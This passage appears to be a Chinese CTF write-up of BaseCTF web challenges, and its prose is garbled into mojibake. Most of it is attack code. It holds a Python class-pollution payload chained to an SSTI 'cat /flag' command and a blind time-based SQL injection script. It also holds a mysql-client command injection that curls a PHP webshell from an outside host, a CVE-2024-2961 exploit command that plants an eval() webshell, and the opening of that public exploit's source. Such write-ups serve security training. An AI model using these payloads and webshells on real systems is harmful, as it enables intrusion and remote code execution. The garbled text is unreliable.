punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span>BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/m4G1c'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            result <span class="token operator">=</span> heaven<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>            message <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> "è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§" <span class="token operator">+</span> message        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"æˆ‘è¦jsonçš„é­”æœ¯"</span>    <span class="token keyword">return</span> <span class="token string">"è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥"</span><span class="token comment">#heaven.py</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>kon<span class="token operator">=</span><span class="token string">"Kon"</span><span class="token punctuation">,</span> pure<span class="token operator">=</span><span class="token string">"Pure"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> confirm<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"å—¯å—¯ï¼Œæˆ‘å·²ç»çŸ¥é“ä½ è¦åˆ›é€ ä¸œè¥¿äº†ï¼Œä½†æ˜¯ä½ æ€ä¹ˆä¸å‘Šè¯‰æˆ‘è¦åˆ›é€ ä»€ä¹ˆï¼Ÿ"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"è¿™æ˜¯ä½ çš„lucky_numberï¼Œè¯·æ‹¿å¥½ï¼Œå»/checkä¸‹æ£€æŸ¥ä¸€ä¸‹å§"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">[</span><span class="token string">"lucky_number"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"ä½ æœ‰ä»€ä¹ˆæƒ³åˆ›é€ çš„å—ï¼Ÿ"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span></code></pre><p>è¿›å…¥é¢˜ç›®ï¼Œæ ¹æ®æç¤ºä¹‹é—´å‰å¾€**&#x2F;flag<strong>ï¼Œå¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç ä»¥åŠæç¤ºã€‚æ ¹æ®ä»£ç å¯çŸ¥åœ¨</strong>&#x2F;m4G1c<strong>è·¯ç”±ä¸‹å­˜åœ¨ç€å¯¼è‡´åŸå‹é“¾æ±¡æŸ“çš„</strong>merge<strong>å‡½æ•°ï¼Œå†ç»“åˆå…¶å®ƒæç¤ºå¯çŸ¥æ­¤å¤„æ˜¯è¦æ±¡æŸ“</strong>heaven.py<strong>çš„</strong>create<strong>å‡½æ•°çš„</strong><strong>kwdefaults</strong><strong>å±æ€§ï¼Œè¯¥å±æ€§å­˜å‚¨çš„æ˜¯ä»…å…³é”®å­—å‚æ•°ï¼Œå³ä½äº</strong><em><strong>ä¹‹åçš„å‚æ•°ã€‚ç”±äº</strong>create</em><em>å‡½æ•°åœ¨å¦ä¸€ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨<strong>sys</strong>æ¨¡å—çš„<strong>modules</strong>å±æ€§æ¥è·å–åˆ°<strong>heaven.py</strong>ï¼Œä½†æ˜¯ä»£ç ä¸­å¹¶æ²¡æœ‰å¯¼å…¥<strong>sys</strong>æ¨¡å—ã€‚é‚£ä¹ˆè¯¥æ€ä¹ˆè·å–åˆ°è¿™ä¸ªæ¨¡å—å‘¢ï¼Ÿåœ¨pythonä¸­å­˜åœ¨ç€*</em><strong>spec</strong><strong>å†…ç½®å±æ€§ï¼ŒåŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œå®šä¹‰åœ¨Lib&#x2F;importlib&#x2F;_bootstrap.pyçš„ç±»ModuleSpecï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨</strong>&lt;æ¨¡å—å&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[â€˜sysâ€™]**è·å–åˆ°sysæ¨¡å—ï¼Œæ­¤å¤„å°±å¯ä»¥ä½¿ç”¨jsonæ¨¡å—è·å–ï¼Œæœ€ç»ˆçš„payloadå¦‚ä¸‹</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"json"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"__spec__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"sys"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"modules"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                    <span class="token property">"heaven"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                        <span class="token property">"create"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"__kwdefaults__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"confirm"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                                              <span class="token property">"lucky_number"</span> <span class="token operator">:</span> <span class="token string">"5346"</span>                                             <span class="token punctuation">&#125;</span>                                         <span class="token punctuation">&#125;</span>                                    <span class="token punctuation">&#125;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆåŠŸæ±¡æŸ“åå»æŒ‡å®šç›®å½•è¿›è¡Œå¸¸è§„çš„sstiæ³¨å…¥å³å¯</p><pre class="language-json" data-language="json"><code class="language-json">flag=<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler.__init__.__globals__.os.popen('cat /flag').read()<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|;|@|\n/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//flag in ctf.flag</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•';"</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½• æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½• </span></code></pre><p>è™½ç„¶banäº†select ä½†æ˜¯å¯ä»¥ä½¿ç”¨showæ¥æŸ¥çœ‹è¡¨åå’Œåˆ—å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token comment"># Tables_in_ctf flag </span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> flag <span class="token comment"># id data</span></code></pre><p>ä½¿ç”¨è¯­å¥<code>delete from flag where data like &#39;f%&#39; and sleep(5)</code>æ¥è¿›è¡Œæ³¨å…¥ï¼Œå¦‚æœlikeæˆåŠŸåŒ¹é…åˆ°ï¼Œandå­—æ®µä¼šå¯¹åé¢çš„è¯­å¥è¿›è¡Œå¤„ç†ï¼Œå¦‚æœlikeåŒ¹é…ä¸åˆ°ï¼ˆè¿”å›falseï¼‰andåè¯­å¥åˆ™ä¸ä¼šè¿›è¡Œå¤„ç†ï¼Œå› ä¸ºsleep()å‡½æ•°è¿”å›å€¼ä¸ºnullï¼Œå› æ­¤æ•´ä¸ªwhereçš„åˆ¤æ–­æ°¸å‡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:37210/"</span>sqlstr <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token string">"&#123;&#125;"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> sqlstr<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"delete from flag where data like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>s<span class="token punctuation">&#125;</span></span><span class="token string">%' and sleep(5)"</span></span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"sql"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            flag <span class="token operator">+=</span> s            <span class="token keyword">break</span></code></pre><h4 id="RCE-or-Sql-Inject-mysql"><a href="#RCE-or-Sql-Inject-mysql" class="headerlink" title="RCE or Sql Inject(mysql ? )"></a>RCE or Sql Inject(mysql ? )</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|;|@|del|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>ç›¸æ¯”ä¸Šä¸€é“é¢˜å¤šè¿‡æ»¤äº†seï¼Œecï¼Œdelï¼Œintoï¼Œoutfileã€‚ä½†æ˜¯æŠŠæ¢è¡Œæ”¾å‡ºæ¥äº†ã€‚å¹¶ä¸”é¢˜ç›®çš„è¯­å¥å¤šäº†ä¸ªæ³¨é‡Šåœ¨æœ«å°¾ã€‚</p><p>é¢˜ç›®æ˜¯ä¸€ä¸ªæ¯”è¾ƒå†·é—¨çš„è€ƒç‚¹ï¼Œmysqlå‘½ä»¤è¡Œç¨‹åºçš„å‘½ä»¤æ‰§è¡Œï¼Œå¸¸è§äºmysqlæœ‰suidæ—¶çš„ææƒ</p><p>hint3ä¸­æç¤ºè¾“ä¸ªé—®å·çœ‹çœ‹ï¼Œå…ˆæ¢è¡Œé€ƒè¿‡æ³¨é‡Šï¼Œç„¶åä¸€ä¸ª?ä¹Ÿå°±æ˜¯<code>sql=%0a?</code></p><p><img src="sql2.png" loading="lazy"></p><p>æ‰€ä»¥å¯ä»¥ä½¿ç”¨systemè¿›è¡Œrceäº†ï¼Œä½†flagä¸åœ¨æ ¹ç›®å½•ï¼Œä¸‹ä¸ªé©¬è¿›æ¥å¥½äº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>sql<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>asystem curl hsad<span class="token operator">.</span>xyz<span class="token operator">/</span>hsad<span class="token operator">.</span>txt <span class="token operator">-</span>o hsad<span class="token operator">.</span>php</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">hsad</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'mysql -u root -p123456 -e "use ctf;show tables;select * from flag"'</span><span class="token punctuation">)</span></code></pre><p>ä¹Ÿå¯ä»¥ç›´æ¥envå°±æœ‰flag</p><h4 id="Sql-Inject-or-RCE-delimiter-handler"><a href="#Sql-Inject-or-RCE-delimiter-handler" class="headerlink" title="Sql Inject or RCE(delimiter handler)"></a>Sql Inject or RCE(delimiter handler)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|st|;|@|delete|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>åŠ äº†<code>st</code>è¿‡æ»¤ ä¸èƒ½ä½¿ç”¨systemäº†ï¼Œå¹¶ä¸”delæ¢æˆäº†deleteã€‚æ‰€ä»¥å…³é”®ç‚¹ä¼šåœ¨delä¸Šå—<del>ï¼ˆå­˜ç–‘ï¼Œ</del>ç¡®ä¿¡</p><p>å‘ç°mysqlçš„å†…ç½®å‘½ä»¤é‡Œé¢æœ‰ä¸€æ¡æ­£å¥½å’Œdelæœ‰å…³<code>delimiter</code>ã€‚å¯ä»¥åˆ©ç”¨delimiteræ¥æ›´æ”¹ä¸€æ¡sqlè¯­å¥çš„ç»“æŸç¬¦</p><p><img src="sql3.png" loading="lazy"></p><p>é‚£ä¹ˆè¿™é“é¢˜å°±å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ¥æ‰“å †å æ³¨å…¥ï¼Œç”±äºselectè¢«ç¦ç”¨æ— æ³•æŸ¥çœ‹flagï¼Œå¯ä»¥ä½¿ç”¨handlerè¯»è¡¨çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯handlerè¯»çš„æ—¶å€™read firstä¸­firstè¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨read nextæ¥ç»•è¿‡</p><p>Payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?sql&#x3D;%0adelimiter hsad%0ahandler flag openhsad%0ahandler flag read next</code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æ‰“å¼€ä¸€ä¸ªè¡¨åä¸º tbl_name çš„è¡¨çš„å¥æŸ„HANDLER tbl_name OPEN [ [AS] alias]# 1ã€é€šè¿‡æŒ‡å®šç´¢å¼•æŸ¥çœ‹è¡¨ï¼Œå¯ä»¥æŒ‡å®šä»ç´¢å¼•é‚£ä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡ NEXT ç»§ç»­æµè§ˆHANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]# 2ã€é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨# FIRST: è·å–ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰# NEXT: è·å–ä¸‹ä¸€è¡Œ# PREV: è·å–ä¸Šä¸€è¡Œ# LAST: è·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]# 3ã€ä¸é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨# READ FIRST: è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œ# READ NEXT: ä¾æ¬¡è·å–å…¶ä»–è¡Œï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åœ¨è·å–å¥æŸ„åç›´æ¥ä½¿ç”¨è·å–ç¬¬ä¸€è¡Œï¼‰# æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ READ NEXT ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœHANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]# å…³é—­å·²æ‰“å¼€çš„å¥æŸ„HANDLER tbl_name CLOSE</code></pre><h4 id="Just-Readme-å‰ç½®-CVE-2024-2961"><a href="#Just-Readme-å‰ç½®-CVE-2024-2961" class="headerlink" title="Just Readme (å‰ç½®)(CVE-2024-2961)"></a>Just Readme (å‰ç½®)(CVE-2024-2961)</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://github.com/ambionics/cnext-exploits">CVE-2024-2961</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 cnext-exploit.py http://challenge.basectf.fun:44169/ <span class="token string">"echo '&lt;?php eval(\<span class="token variable">$_POST</span>[0]);?>'>/var/www/html/hsad.php;"</span></code></pre><p><strong>cnext-exploit.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment">#</span><span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><span class="token comment"># Date: 2024-05-27</span><span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><span class="token comment">#</span><span class="token comment"># TODO Parse LIBC to know if patched</span><span class="token comment">#</span><span class="token comment"># INFORMATIONS</span><span class="token comment">#</span><span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><span class="token comment">#</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"åŠ„"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```        Tweak it to fit your target, and start the exploit.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span 